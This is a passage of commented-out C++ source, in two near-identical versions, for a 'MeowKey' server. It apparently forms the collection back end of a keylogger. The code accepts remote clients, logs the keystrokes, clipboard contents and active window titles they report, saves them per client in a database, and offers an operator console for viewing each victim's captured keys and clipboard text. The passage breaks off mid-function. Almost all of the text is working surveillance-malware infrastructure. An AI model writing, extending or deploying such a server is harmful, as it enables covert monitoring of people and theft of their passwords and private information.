// //             handler_thread_.join();
// //         cout << "[Client handler stopped: " << client_id_ << "]" << endl;
// //     }

// //     int getSocket() const { return client_socket_; }
// //     string getClientId() const { return client_id_; }
// //     bool isRunning() const { return running_; }
// // };

// // mutex ClientHandler::display_mutex_;

// // class Server
// // {
// // private:
// //     int port_;
// //     int server_socket_;
// //     atomic<bool> running_;
// //     thread accept_thread_;

// //     unordered_map<string, unique_ptr<ClientHandler>> pending_clients_;
// //     unordered_map<string, unique_ptr<ClientHandler>> active_clients_;
// //     mutex clients_mutex_;

// //     shared_ptr<MeowKeyDatabase> db_;
// //     string storage_file_;

// //     string readHandshakeLine(int sock, int timeout_ms = 2000)
// //     {
// // #ifdef _WIN32
// //         char tmp[1024];
// //         int r = recv(sock, tmp, sizeof(tmp) - 1, 0);
// //         if (r <= 0) return string();
// //         tmp[r] = '\0';
// //         string s(tmp);
// //         size_t nl = s.find_first_of("\r\n");
// //         if (nl != string::npos) s = s.substr(0, nl);
// //         return s;
// // #else
// //         const int max_peek = 4096;
// //         vector<char> peekbuf(max_peek + 1);
// //         auto start = chrono::steady_clock::now();
// //         while (true)
// //         {
// //             ssize_t pr = recv(sock, peekbuf.data(), max_peek, MSG_PEEK);
// //             if (pr < 0)
// //             {
// //                 if (errno == EAGAIN || errno == EWOULDBLOCK)
// //                 {
// //                     this_thread::sleep_for(chrono::milliseconds(50));
// //                     if (chrono::duration_cast<chrono::milliseconds>(chrono::steady_clock::now() - start).count() > timeout_ms)
// //                         return string();
// //                     continue;
// //                 }
// //                 return string();
// //             }
// //             if (pr == 0) return string();

// //             peekbuf[pr] = '\0';
// //             string s(peekbuf.data(), (size_t)pr);
// //             size_t nl = s.find_first_of("\r\n");
// //             if (nl == string::npos)
// //             {
// //                 this_thread::sleep_for(chrono::milliseconds(50));
// //                 if (chrono::duration_cast<chrono::milliseconds>(chrono::steady_clock::now() - start).count() > timeout_ms)
// //                     return string();
// //                 continue;
// //             }

// //             size_t consume = nl + 1;
// //             if (nl + 1 < (size_t)pr && peekbuf[nl] == '\r' && peekbuf[nl + 1] == '\n')
// //                 consume = nl + 2;

// //             vector<char> linebuf(consume + 1);
// //             ssize_t cr = recv(sock, linebuf.data(), (ssize_t)consume, 0);
// //             if (cr <= 0) return string();
// //             linebuf[cr] = '\0';
// //             string line(linebuf.data(), (size_t)cr);
// //             while (!line.empty() && (line.back() == '\n' || line.back() == '\r')) line.pop_back();
// //             return line;
// //         }
// // #endif
// //     }

// //     void handleNewConnectionSocket(int client_sock, const string &client_id)
// //     {
// //         lock_guard<mutex> lock(clients_mutex_);
// //         if (pending_clients_.count(client_id) || active_clients_.count(client_id))
// //         {
// //             cout << "\n❌ Client " << client_id << " already connected!" << endl;
// //             string msg = "ERROR: Already connected\n";
// //             send(client_sock, msg.c_str(), (int)msg.size(), 0);
// // #ifdef _WIN32
// //             closesocket(client_sock);
// // #else
// //             close(client_sock);
// // #endif
// //             return;
// //         }

// //         cout << "\n🔔 ═══════════════════════════════════════════════════════════" << endl;
// //         cout << "   NEW CONNECTION REQUEST" << endl;
// //         cout << "   Client ID: " << client_id << endl;
// //         cout << "   Status: " << (db_->clientExists(client_id) ? "RETURNING" : "NEW") << endl;
// //         cout << "   ═══════════════════════════════════════════════════════════" << endl;
// //         cout << "   Action: accept " << client_id << " | reject " << client_id << endl;
// //         cout << "   ═══════════════════════════════════════════════════════════\n" << endl;

// //         pending_clients_[client_id] = make_unique<ClientHandler>(client_sock, client_id, db_);
// //     }

// // public:
// //     Server(int port, const string &storage_file = "meowkey_server.db")
// //         : port_(port), server_socket_(-1), running_(false), storage_file_(storage_file)
// //     {
// //         db_ = make_shared<MeowKeyDatabase>(storage_file_);
// //         if (!db_->open())
// //             throw runtime_error("Failed to open database: " + storage_file_);
// //         cout << "✅ Database opened: " << storage_file_ << endl;
// //     }

// //     ~Server()
// //     {
// //         stop();
// //     }

// //     bool start()
// //     {
// //         if (running_) return false;
// //         running_ = true;
// //         accept_thread_ = thread(&Server::acceptLoop, this);
// //         printBanner();
// //         return true;
// //     }

// //     void stop()
// //     {
// //         cout << "\n⏹️  Shutting down server..." << endl;
// //         running_ = false;

// //         if (server_socket_ >= 0)
// //         {
// // #ifdef _WIN32
// //             closesocket(server_socket_);
// // #else
// //             shutdown(server_socket_, SHUT_RDWR);
// //             close(server_socket_);
// // #endif
// //             server_socket_ = -1;
// //         }

// //         if (accept_thread_.joinable()) accept_thread_.join();

// //         {
// //             lock_guard<mutex> lock(clients_mutex_);
// //             for (auto &p : active_clients_) p.second->stop();
// //             active_clients_.clear();
// //             for (auto &p : pending_clients_) p.second->stop();
// //             pending_clients_.clear();
// //         }

// //         if (db_) { db_->syncToDisk(); db_->close(); }
// //         SocketUtils::cleanupWSA();
// //         cout << "✅ Server shutdown complete" << endl;
// //     }

// //     void runCommandLoop()
// //     {
// //         string line;
// //         while (running_)
// //         {
// //             cout << "meowkey> ";
// //             if (!getline(cin, line)) break;
// //             if (line.empty()) continue;
// //             processCommand(line);
// //         }
// //     }

// //     void processCommand(const string &cmd)
// //     {
// //         istringstream iss(cmd);
// //         string c; iss >> c;
// //         if (c == "accept")
// //         {
// //             string id;
// //             if (iss >> id)
// //                 acceptClient(id);
// //             else
// //             {
// //                 lock_guard<mutex> lock(clients_mutex_);
// //                 if (pending_clients_.size() == 1)
// //                 {
// //                     string only = pending_clients_.begin()->first;
// //                     cout << "Auto-accepting pending client: " << only << endl;
// //                     acceptClient(only);
// //                 }
// //                 else
// //                 {
// //                     cout << "Usage: accept <client_id>" << endl;
// //                 }
// //             }
// //         }
// //         else if (c == "reject")
// //         {
// //             string id; if (iss >> id) rejectClient(id); else cout << "Usage: reject <id>" << endl;
// //         }
// //         else if (c == "kick")
// //         {
// //             string id; if (iss >> id) kickClient(id); else cout << "Usage: kick <id>" << endl;
// //         }
// //         else if (c == "list") listClients();
// //         else if (c == "clients") showAllClients();
// //         else if (c == "view")
// //         {
// //             string id, type="all";
// //             if (iss >> id) { if (iss >> type) ; viewClientData(id, type); }
// //             else cout << "Usage: view <client_id> [all|ks|clip|win]" << endl;
// //         }
// //         else if (c == "flush")
// //         {
// //             string id;
// //             if (iss >> id) flushClient(id); else flushAllClients();
// //         }
// //         else if (c == "delete")
// //         {
// //             string id; if (iss >> id) deleteClient(id); else cout << "Usage: delete <id>" << endl;
// //         }
// //         else if (c == "stats") showStats();
// //         else if (c == "range")
// //         {
// //             string id; uint64_t s,e;
// //             if (iss >> id >> s >> e) viewRangedData(id,s,e);
// //             else cout << "Usage: range <id> <start> <end>" << endl;
// //         }
// //         else if (c == "help") printBanner();
// //         else if (c == "quit" || c == "exit") stop();
// //         else cout << "Unknown command. Type 'help'." << endl;
// //     }

// // private:
// //     void printBanner()
// //     {
// //         cout << "\n╔═══════════════════════════════════════════════════════════╗" << endl;
// //         cout << "║        🐱 MEOWKEY SERVER - LIVE MONITORING 🐱             ║" << endl;
// //         cout << "╠═══════════════════════════════════════════════════════════╣" << endl;
// //         cout << "║ Status: RUNNING                                           ║" << endl;
// //         cout << "║ Port: " << port_ << "                                              ║" << endl;
// //         cout << "║ Database: " << storage_file_ << "                               ║" << endl;
// //         cout << "╠═══════════════════════════════════════════════════════════╣" << endl;
// //         cout << "║ COMMANDS:                                                 ║" << endl;
// //         cout << "║   accept <id>      - Accept pending client                ║" << endl;
// //         cout << "║   reject <id>      - Reject pending client                ║" << endl;
// //         cout << "║   kick <id>        - Disconnect active client             ║" << endl;
// //         cout << "║   list             - Show active/pending clients          ║" << endl;
// //         cout << "║   clients          - Show all registered clients          ║" << endl;
// //         cout << "║   view <id> <type> - View client data (ks/clip/win/all)   ║" << endl;
// //         cout << "║   range <id> s e   - Time range query (microseconds)     ║" << endl;
// //         cout << "║   flush [id]       - Flush buffers (all or specific)      ║" << endl;
// //         cout << "║   delete <id>      - Delete client and all data           ║" << endl;
// //         cout << "║   stats            - Show database statistics             ║" << endl;
// //         cout << "║   help             - Show this help                      ║" << endl;
// //         cout << "║   quit             - Stop server                         ║" << endl;
// //         cout << "╚═══════════════════════════════════════════════════════════╝\n" << endl;
// //     }

// //     void acceptLoop()
// //     {
// //         try
// //         {
// //             server_socket_ = SocketUtils::createSocket();
// // #ifndef _WIN32
// //             int flags = fcntl(server_socket_, F_GETFL, 0);
// //             fcntl(server_socket_, F_SETFL, flags | O_NONBLOCK);
// // #endif
// //             SocketUtils::bindSocket(server_socket_, port_);
// //             SocketUtils::listenSocket(server_socket_);
// //             cout << "🔊 Listening on port " << port_ << "...\n" << endl;

// //             while (running_)
// //             {
// //                 int client_sock = accept(server_socket_, nullptr, nullptr);
// //                 if (client_sock < 0)
// //                 {
// // #ifndef _WIN32
// //                     if (errno == EAGAIN || errno == EWOULDBLOCK)
// //                     {
// //                         this_thread::sleep_for(chrono::milliseconds(50));
// //                         continue;
// //                     }
// // #endif
// //                     this_thread::sleep_for(chrono::milliseconds(50));
// //                     continue;
// //                 }

// //                 string line = readHandshakeLine(client_sock, 1500);
// //                 if (line.empty())
// //                 {
// // #ifdef _WIN32
// //                     closesocket(client_sock);
// // #else
// //                     close(client_sock);
// // #endif
// //                     continue;
// //                 }

// //                 string id;
// //                 size_t col = line.find(':');
// //                 if (col != string::npos)
// //                 {
// //                     id = line.substr(col + 1);
// //                 }
// //                 else
// //                 {
// //                     id = line;
// //                 }
// //                 size_t st = id.find_first_not_of(" \t\r\n");
// //                 size_t ed = id.find_last_not_of(" \t\r\n");
// //                 if (st == string::npos) id.clear();
// //                 else id = id.substr(st, ed - st + 1);

// //                 if (id.empty())
// //                 {
// // #ifdef _WIN32
// //                     closesocket(client_sock);
// // #else
// //                     close(client_sock);
// // #endif
// //                     continue;
// //                 }

// //                 handleNewConnectionSocket(client_sock, id);
// //             }
// //         }
// //         catch (const exception &e)
// //         {
// //             if (running_) cerr << "❌ Accept loop error: " << e.what() << endl;
// //         }
// //     }

// //     void acceptClient(const string &client_id)
// //     {
// //         lock_guard<mutex> lock(clients_mutex_);
// //         auto it = pending_clients_.find(client_id);
// //         if (it == pending_clients_.end())
// //         {
// //             cout << "❌ Client '" << client_id << "' not in pending list!" << endl;
// //             return;
// //         }

// //         auto handler = move(it->second);
// //         pending_clients_.erase(it);

// //         // CRITICAL: Register client BEFORE starting handler
// //         ClientRecord rec;
// //         bool existing = db_->registerClient(client_id, rec);

// //         // CRITICAL: Sync IMMEDIATELY after registration
// //         db_->syncToDisk();

// //         cout << (existing ? "✅ Returning" : "🆕 New") << " client registered: " << client_id << endl;
// //         cout << "   Hash: " << rec.client_hash << endl;
// //         cout << "   Sessions: " << rec.session_count << endl;

// //         // Send approval
// //         string msg = "APPROVED\n";
// //         send(handler->getSocket(), msg.c_str(), (int)msg.size(), 0);

// //         // NOW start handler
// //         handler->start();
// //         active_clients_[client_id] = move(handler);

// //         cout << "✅ Client handler started: " << client_id << endl;
// //     }

// //     void rejectClient(const string &client_id)
// //     {
// //         lock_guard<mutex> lock(clients_mutex_);
// //         auto it = pending_clients_.find(client_id);
// //         if (it == pending_clients_.end())
// //         {
// //             cout << "❌ Client '" << client_id << "' not in pending list!" << endl;
// //             return;
// //         }
// //         auto handler = move(it->second);
// //         pending_clients_.erase(it);
// //         string msg = "REJECTED\n";
// //         send(handler->getSocket(), msg.c_str(), (int)msg.size(), 0);
// //         handler->stop();
// //         cout << "❌ Client rejected: " << client_id << endl;
// //     }

// //     void kickClient(const string &client_id)
// //     {
// //         lock_guard<mutex> lock(clients_mutex_);
// //         auto it = active_clients_.find(client_id);
// //         if (it != active_clients_.end())
// //         {
// //             it->second->stop();
// //             active_clients_.erase(it);
// //             db_->syncToDisk(); // Sync on disconnect
// //             cout << "✅ Client kicked: " << client_id << endl;
// //             return;
// //         }
// //         it = pending_clients_.find(client_id);
// //         if (it != pending_clients_.end())
// //         {
// //             it->second->stop();
// //             pending_clients_.erase(it);
// //             cout << "✅ Pending client removed: " << client_id << endl;
// //             return;
// //         }
// //         cout << "❌ Client not found!" << endl;
// //     }

// //     void listClients()
// //     {
// //         lock_guard<mutex> lock(clients_mutex_);
// //         cout << "\nPENDING (" << pending_clients_.size() << "):" << endl;
// //         if (pending_clients_.empty()) cout << "  (none)\n";
// //         else for (auto &p : pending_clients_) cout << "  " << p.first << endl;
// //         cout << "\nACTIVE (" << active_clients_.size() << "):" << endl;
// //         if (active_clients_.empty()) cout << "  (none)\n";
// //         else for (auto &p : active_clients_) cout << "  " << p.first << endl;
// //     }

// //     void showAllClients()
// //     {
// //         auto clients = db_->getAllClients();
// //         cout << "\nALL REGISTERED CLIENTS IN DATABASE:" << endl;
// //         if (clients.empty()) { cout << "  (no clients in database)\n"; return; }
// //         for (auto &c : clients)
// //         {
// //             ClientRecord r;
// //             db_->getClientStats(c, r);
// //             cout << "  * " << c << " | Sessions: " << r.session_count
// //                  << " KS:" << r.total_keystrokes << " CB:" << r.total_clipboard << " W:" << r.total_windows << endl;
// //         }
// //     }

// //     void viewClientData(const string &client_id, const string &type)
// //     {
// //         if (!db_->clientExists(client_id))
// //         {
// //             cout << "❌ Client '" << client_id << "' not found!" << endl;
// //             return;
// //         }
// //         QueryResult res;
// //         if (!db_->queryClientAllEvents(client_id, res))
// //         {
// //             cout << "❌ Failed to query client data!" << endl;
// //             return;
// //         }

// //         cout << "\nDATA FOR CLIENT: " << client_id << endl;
// //         if (type == "all" || type == "keystroke" || type == "ks")
// //         {
// //             cout << "\nKEYSTROKES (" << res.keystrokes.size() << "):\n";
// //             for (size_t i = 0; i < res.keystrokes.size(); ++i)
// //             {
// //                 cout << "  " << (i+1) << ". [" << res.keystrokes[i].timestamp << "] " << res.keystrokes[i].key << "\n";
// //             }
// //         }
// //         if (type == "all" || type == "clipboard" || type == "clip")
// //         {
// //             cout << "\nCLIPBOARD (" << res.clipboard_events.size() << "):\n";
// //             for (size_t i = 0; i < res.clipboard_events.size(); ++i)
// //             {
// //                 string s(res.clipboard_events[i].content, res.clipboard_events[i].content_length);
// //                 cout << "  " << (i+1) << ". [" << res.clipboard_events[i].timestamp << "] " << s << "\n";
// //             }
// //         }
// //         if (type == "all" || type == "window" || type == "win")
// //         {
// //             cout << "\nWINDOWS (" << res.window_events.size() << "):\n";
// //             for (size_t i = 0; i < res.window_events.size(); ++i)
// //             {
// //                 cout << "  " << (i+1) << ". [" << res.window_events[i].timestamp << "] "
// //                      << res.window_events[i].title << " [" << res.window_events[i].process << "]\n";
// //             }
// //         }
// //     }

// //     void viewRangedData(const string &client_id, uint64_t start_ts, uint64_t end_ts)
// //     {
// //         if (!db_->clientExists(client_id)) { cout << "❌ Client not found!\n"; return; }
// //         QueryResult res;
// //         if (!db_->queryClientEventsByTimeRange(client_id, start_ts, end_ts, res)) { cout << "❌ Query failed!\n"; return; }
// //         cout << "Range results: Total=" << res.totalEvents() << " KS=" << res.keystrokes.size()
// //              << " CB=" << res.clipboard_events.size() << " W=" << res.window_events.size() << endl;
// //     }

// //     void flushClient(const string &client_id)
// //     {
// //         db_->syncToDisk();
// //         cout << "Flushed client: " << client_id << endl;
// //     }

// //     void flushAllClients()
// //     {
// //         db_->syncToDisk();
// //         cout << "Flushed DB to disk." << endl;
// //     }

// //     void deleteClient(const string &client_id)
// //     {
// //         kickClient(client_id);
// //         if (db_->deleteClient(client_id)) cout << "Deleted client: " << client_id << endl;
// //         else cout << "Delete failed or client not present." << endl;
// //     }

// //     void showStats()
// //     {
// //         db_->printStats();
// //     }
// // };

// // #endif



// #ifndef SERVER_CROSS_HPP
// #define SERVER_CROSS_HPP

// #include "../socket_utils_cross.hpp"
// #include "../meowkey_database.hpp"
// #include <thread>
// #include <atomic>
// #include <unordered_map>
// #include <mutex>
// #include <deque>
// #include <sstream>
// #include <iostream>
// #include <memory>
// #include <iomanip>
// #include <chrono>
// #include <cstring>
// #include <vector>

// #ifdef _WIN32
// #include <winsock2.h>
// #else
// #include <sys/socket.h>
// #include <sys/types.h>
// #include <fcntl.h>
// #include <unistd.h>
// #include <errno.h>
// #endif

// using namespace std;

// class ClientHandler
// {
// private:
//     int client_socket_;
//     atomic<bool> running_;
//     thread handler_thread_;
//     string client_id_;
//     uint32_t client_hash_;
//     shared_ptr<MeowKeyDatabase> db_;
//     deque<string> recent_events_;
//     static mutex display_mutex_;

//     // ✅ CRITICAL: Sync every 5 events to disk
//     atomic<int> events_since_sync_;
//     static const int SYNC_INTERVAL = 5;

//     void displayRecentEvents()
//     {
//         lock_guard<mutex> lock(display_mutex_);
//         cout << "\n=== " << client_id_ << " " << string(max(0, 45 - (int)client_id_.length()), '-') << "===" << endl;
//         if (recent_events_.empty())
//         {
//             cout << "| (No events yet)" << string(39, ' ') << "|" << endl;
//         }
//         else
//         {
//             for (const auto &e : recent_events_)
//             {
//                 string d = e.substr(0, 52);
//                 cout << "| " << left << setw(52) << d << "|" << endl;
//             }
//         }
//         cout << "==============================================================" << endl;
//     }

//     void pushRecent(const string &s)
//     {
//         lock_guard<mutex> lock(display_mutex_);
//         recent_events_.push_back(s);
//         if (recent_events_.size() > 20)
//             recent_events_.pop_front();
//     }

//     void processEventLine(const string &line)
//     {
//         if (line.empty())
//             return;

//         uint64_t ts = MeowKeyDatabase::getCurrentTimestamp();

//         size_t start = line.find_first_not_of(" \t\r\n");
//         size_t end = line.find_last_not_of(" \t\r\n");
//         string msg = (start == string::npos) ? string() : line.substr(start, end - start + 1);
//         if (msg.empty())
//             return;

//         try
//         {
//             if (msg.rfind("KEY:", 0) == 0 || msg.rfind("KEY: ", 0) == 0)
//             {
//                 string payload = msg.substr(msg.find(':') + 1);
//                 if (!payload.empty() && payload[0] == ' ')
//                     payload.erase(0, 1);

//                 KeystrokeEvent ke{};
//                 ke.timestamp = ts;
//                 ke.client_hash = client_hash_;
//                 ke.sequence = 0;
//                 strncpy(ke.key, payload.c_str(), sizeof(ke.key) - 1);
//                 ke.key[sizeof(ke.key) - 1] = '\0';

//                 db_->insertKeystroke(client_hash_, ke);
//                 pushRecent("[KEY] " + payload);
//                 cout << "    ✓ Keystroke stored: " << payload << endl;
//             }
//             else if (msg.rfind("CLIPBOARD:", 0) == 0 || msg.rfind("CLIPBOARD: ", 0) == 0)
//             {
//                 string payload = msg.substr(msg.find(':') + 1);
//                 if (!payload.empty() && payload[0] == ' ')
//                     payload.erase(0, 1);

//                 ClipboardEvent ce{};
//                 ce.timestamp = ts;
//                 ce.client_hash = client_hash_;
//                 ce.content_length = (uint32_t)min((size_t)sizeof(ce.content), payload.size());
//                 memset(ce.content, 0, sizeof(ce.content));
//                 memcpy(ce.content, payload.data(), ce.content_length);

//                 db_->insertClipboard(client_hash_, ce);

//                 string truncated = payload.substr(0, 40);
//                 if (payload.size() > 40)
//                     truncated += "...";
//                 pushRecent("[CLIP] " + truncated);
//                 cout << "    ✓ Clipboard stored: " << truncated << endl;
//             }
//             else if (msg.rfind("WINDOW:", 0) == 0 || msg.rfind("WINDOW: ", 0) == 0)
//             {
//                 string payload = msg.substr(msg.find(':') + 1);
//                 if (!payload.empty() && payload[0] == ' ')
//                     payload.erase(0, 1);

//                 string title = payload;
//                 string process = "Unknown";
//                 size_t br = payload.rfind(" [");
//                 if (br != string::npos && payload.back() == ']')
//                 {
//                     title = payload.substr(0, br);
//                     process = payload.substr(br + 2, payload.size() - br - 3);
//                 }

//                 WindowEvent we{};
//                 we.timestamp = ts;
//                 we.client_hash = client_hash_;
//                 strncpy(we.title, title.c_str(), sizeof(we.title) - 1);
//                 we.title[sizeof(we.title) - 1] = '\0';
//                 strncpy(we.process, process.c_str(), sizeof(we.process) - 1);
//                 we.process[sizeof(we.process) - 1] = '\0';

//                 db_->insertWindow(client_hash_, we);

//                 string truncated = title.substr(0, 40);
//                 if (title.size() > 40)
//                     truncated += "...";
//                 pushRecent("[WIN] " + truncated);
//                 cout << "    ✓ Window stored: " << truncated << endl;
//             }
//             else
//             {
//                 KeystrokeEvent ke{};
//                 ke.timestamp = ts;
//                 ke.client_hash = client_hash_;
//                 ke.sequence = 0;
//                 strncpy(ke.key, msg.c_str(), sizeof(ke.key) - 1);
//                 ke.key[sizeof(ke.key) - 1] = '\0';
//                 db_->insertKeystroke(client_hash_, ke);
//                 pushRecent("[KEY] " + msg);
//                 cout << "    ✓ Keystroke (fallback) stored: " << msg << endl;
//             }

//             displayRecentEvents();

//             // ✅ CRITICAL: Sync to disk every N events
//             events_since_sync_++;
//             if (events_since_sync_ >= SYNC_INTERVAL)
//             {
//                 cout << "💾 [SYNC] Writing " << SYNC_INTERVAL << " events to disk for " << client_id_ << endl;
//                 db_->syncToDisk();
//                 events_since_sync_ = 0;
//             }
//         }
//         catch (const exception &e)
//         {
//             cerr << "❌ Error processing event for " << client_id_ << ": " << e.what() << endl;
//         }
//     }

//     void clientLoop()
//     {
//         char buf[4096];
//         string leftover;

//         cout << "👂 [" << client_id_ << "] Listening for events..." << endl;

//         while (running_)
//         {
//             ssize_t r = recv(client_socket_, buf, sizeof(buf) - 1, 0);
//             if (r <= 0)
//             {
//                 cout << "⚠️  [" << client_id_ << "] recv returned " << r << ", disconnecting..." << endl;
//                 break;
//             }
//             buf[r] = '\0';
//             string data = leftover + string(buf);
//             leftover.clear();

//             istringstream ss(data);
//             string line;
//             while (getline(ss, line))
//             {
//                 if (ss.eof() && data.back() != '\n')
//                 {
//                     leftover = line;
//                     break;
//                 }

//                 if (!line.empty())
//                     processEventLine(line);
//             }
//         }

//         // ✅ CRITICAL: Final sync on ANY disconnect
//         cout << "\n💾 [FINAL SYNC] Flushing ALL remaining data for " << client_id_ << endl;
//         db_->syncToDisk();
//         cout << "✅ " << client_id_ << " fully disconnected with data persisted" << endl;
//     }

// public:

//     ClientHandler(int sock, const string &id, shared_ptr<MeowKeyDatabase> db)
//         : client_socket_(sock), running_(false), client_id_(id), db_(db), events_since_sync_(0)
//     {
//         client_hash_ = ClientRecord::hashString(client_id_);
       
//     }

//     ~ClientHandler()
//     {
//         stop();
//     }

//     void start()
//     {
//         running_ = true;
//         handler_thread_ = thread([this]
//                                  { clientLoop(); });
//     }

//     void stop()
//     {
//         if (!running_)
//             return;
//         running_ = false;
// #ifdef _WIN32
//         shutdown(client_socket_, SD_BOTH);
//         closesocket(client_socket_);
// #else
//         shutdown(client_socket_, SHUT_RDWR);
//         close(client_socket_);
// #endif
//         client_socket_ = -1;
//         if (handler_thread_.joinable())
//             handler_thread_.join();
//         cout << "[Client handler stopped: " << client_id_ << "]" << endl;
//     }

//     int getSocket() const { return client_socket_; }
//     string getClientId() const { return client_id_; }
//     bool isRunning() const { return running_; }
// };

// mutex ClientHandler::display_mutex_;

// class Server
// {
// private:
//     int port_;
//     int server_socket_;
//     atomic<bool> running_;
//     thread accept_thread_;

//     unordered_map<string, unique_ptr<ClientHandler>> pending_clients_;
//     unordered_map<string, unique_ptr<ClientHandler>> active_clients_;
//     mutex clients_mutex_;

//     shared_ptr<MeowKeyDatabase> db_;
//     string storage_file_;

//  void loadAllClientsFromDisk()
//     {
//         auto clients = db_->getAllClients(); // This should now work with the fixed version
//         cout << "Loaded " << clients.size() << " clients from database" << endl;
//     }

//     string readHandshakeLine(int sock, int timeout_ms = 2000)
//     {
// #ifdef _WIN32
//         char tmp[1024];
//         int r = recv(sock, tmp, sizeof(tmp) - 1, 0);
//         if (r <= 0)
//             return string();
//         tmp[r] = '\0';
//         string s(tmp);
//         size_t nl = s.find_first_of("\r\n");
//         if (nl != string::npos)
//             s = s.substr(0, nl);
//         return s;
// #else
//         const int max_peek = 4096;
//         vector<char> peekbuf(max_peek + 1);
//         auto start = chrono::steady_clock::now();
//         while (true)
//         {
//             ssize_t pr = recv(sock, peekbuf.data(), max_peek, MSG_PEEK);
//             if (pr < 0)
//             {
//                 if (errno == EAGAIN || errno == EWOULDBLOCK)
//                 {
//                     this_thread::sleep_for(chrono::milliseconds(50));
//                     if (chrono::duration_cast<chrono::milliseconds>(chrono::steady_clock::now() - start).count() > timeout_ms)
//                         return string();
//                     continue;
//                 }
//                 return string();
//             }
//             if (pr == 0)
//                 return string();

//             peekbuf[pr] = '\0';
//             string s(peekbuf.data(), (size_t)pr);
//             size_t nl = s.find_first_of("\r\n");
//             if (nl == string::npos)
//             {
//                 this_thread::sleep_for(chrono::milliseconds(50));
//                 if (chrono::duration_cast<chrono::milliseconds>(chrono::steady_clock::now() - start).count() > timeout_ms)
//                     return string();
//                 continue;
//             }

//             size_t consume = nl + 1;
//             if (nl + 1 < (size_t)pr && peekbuf[nl] == '\r' && peekbuf[nl + 1] == '\n')
//                 consume = nl + 2;

//             vector<char> linebuf(consume + 1);
//             ssize_t cr = recv(sock, linebuf.data(), (ssize_t)consume, 0);
//             if (cr <= 0)
//                 return string();
//             linebuf[cr] = '\0';
//             string line(linebuf.data(), (size_t)cr);
//             while (!line.empty() && (line.back() == '\n' || line.back() == '\r'))
//                 line.pop_back();
//             return line;
//         }
// #endif
//     }

//     void handleNewConnectionSocket(int client_sock, const string &client_id)
//     {
//         lock_guard<mutex> lock(clients_mutex_);
//         if (pending_clients_.count(client_id) || active_clients_.count(client_id))
//         {
//             cout << "\n❌ Client " << client_id << " already connected!" << endl;
//             string msg = "ERROR: Already connected\n";
//             send(client_sock, msg.c_str(), (int)msg.size(), 0);
// #ifdef _WIN32
//             closesocket(client_sock);
// #else
//             close(client_sock);
// #endif
//             return;
//         }

//         cout << "\n🔔 ═══════════════════════════════════════════════════════════" << endl;
//         cout << "   NEW CONNECTION REQUEST" << endl;
//         cout << "   Client ID: " << client_id << endl;
//         cout << "   Status: " << (db_->clientExists(client_id) ? "RETURNING" : "NEW") << endl;
//         cout << "   ═══════════════════════════════════════════════════════════" << endl;
//         cout << "   Action: accept " << client_id << " | reject " << client_id << endl;
//         cout << "   ═══════════════════════════════════════════════════════════\n"
//              << endl;

//         pending_clients_[client_id] = make_unique<ClientHandler>(client_sock, client_id, db_);
//     }




// public:
//     Server(int port, const string &storage_file = "meowkey_server.db")
//         : port_(port), server_socket_(-1), running_(false), storage_file_(storage_file)
//     {
//         db_ = make_shared<MeowKeyDatabase>(storage_file_);
//         if (!db_->open())
//             throw runtime_error("Failed to open database: " + storage_file_);
//         cout << "✅ Database opened: " << storage_file_ << endl;

//          loadAllClientsFromDisk();
//     }

//     ~Server()
//     {
//        db_->syncToDisk();  // Sync first
//         db_->close();       // Then close
//     }

//     bool start()
//     {
//         if (running_)
//             return false;
//         running_ = true;
//         accept_thread_ = thread(&Server::acceptLoop, this);
//         printBanner();
//         return true;
//     }

//     void stop()
//     {
//         cout << "\n⏹️  Shutting down server..." << endl;
//         running_ = false;

//         if (server_socket_ >= 0)
//         {
// #ifdef _WIN32
//             closesocket(server_socket_);
// #else
//             shutdown(server_socket_, SHUT_RDWR);
//             close(server_socket_);
// #endif
//             server_socket_ = -1;
//         }

//         if (accept_thread_.joinable())
//             accept_thread_.join();

//         {
//             lock_guard<mutex> lock(clients_mutex_);
//             // CRITICAL: Stop all clients FIRST to flush their data
//             for (auto &p : active_clients_)
//             {
//                 cout << "💾 Flushing data for client: " << p.first << endl;
//                 p.second->stop(); // This should trigger final sync
//             }
//             active_clients_.clear();

//             for (auto &p : pending_clients_)
//                 p.second->stop();
//             pending_clients_.clear();
//         }

//         // CRITICAL: Force database sync
//         if (db_)
//         {
//             cout << "💾 Final database sync to disk..." << endl;
//             db_->syncToDisk();
//             db_->close();
//         }

//         SocketUtils::cleanupWSA();
//         cout << "✅ Server shutdown complete" << endl;
//     }


//     void runCommandLoop()
//     {
//         string line;
//         while (running_)
//         {
//             cout << "meowkey> ";
//             if (!getline(cin, line))
//                 break;
//             if (line.empty())
//                 continue;
//             processCommand(line);
//         }
//     }

//     void processCommand(const string &cmd)
//     {
//         istringstream iss(cmd);
//         string c;
//         iss >> c;
//         if (c == "accept")
//         {
//             string id;
//             if (iss >> id)
//                 acceptClient(id);
//             else
//             {
//                 lock_guard<mutex> lock(clients_mutex_);
//                 if (pending_clients_.size() == 1)
//                 {
//                     string only = pending_clients_.begin()->first;
//                     cout << "Auto-accepting pending client: " << only << endl;
//                     acceptClient(only);
//                 }
//                 else
//                 {
//                     cout << "Usage: accept <client_id>" << endl;
//                 }
//             }
//         }
//         else if (c == "reject")
//         {
//             string id;
//             if (iss >> id)
//                 rejectClient(id);
//             else
//                 cout << "Usage: reject <id>" << endl;
//         }
//         else if (c == "kick")
//         {
//             string id;
//             if (iss >> id)
//                 kickClient(id);
//             else
//                 cout << "Usage: kick <id>" << endl;
//         }
//         else if (c == "list")
//             listClients();
//         else if (c == "clients")
//             showAllClients();
//         else if (c == "view")
//         {
//             string id, type = "all";
//             if (iss >> id)
//             {
//                 if (iss >> type)
//                     ;
//                 viewClientData(id, type);
//             }
//             else
//                 cout << "Usage: view <client_id> [all|ks|clip|win]" << endl;
//         }
//         else if (c == "flush")
//         {
//             string id;
//             if (iss >> id)
//                 flushClient(id);
//             else
//                 flushAllClients();
//         }
//         else if (c == "delete")
//         {
//             string id;
//             if (iss >> id)
//                 deleteClient(id);
//             else
//                 cout << "Usage: delete <id>" << endl;
//         }
//         else if (c == "stats")
//             showStats();
//         else if (c == "range")
//         {
//             string id;
//             uint64_t s, e;
//             if (iss >> id >> s >> e)
//                 viewRangedData(id, s, e);
//             else
//                 cout << "Usage: range <id> <start> <end>" << endl;
//         }
//         else if (c == "help")
//             printBanner();
//         else if (c == "quit" || c == "exit")
//             stop();
//         else
//             cout << "Unknown command. Type 'help'." << endl;
//     }

// private:
//     void printBanner()
//     {
//         cout << "\n╔═══════════════════════════════════════════════════════════╗" << endl;
//         cout << "║        🐱 MEOWKEY SERVER - LIVE MONITORING 🐱             ║" << endl;
//         cout << "╠═══════════════════════════════════════════════════════════╣" << endl;
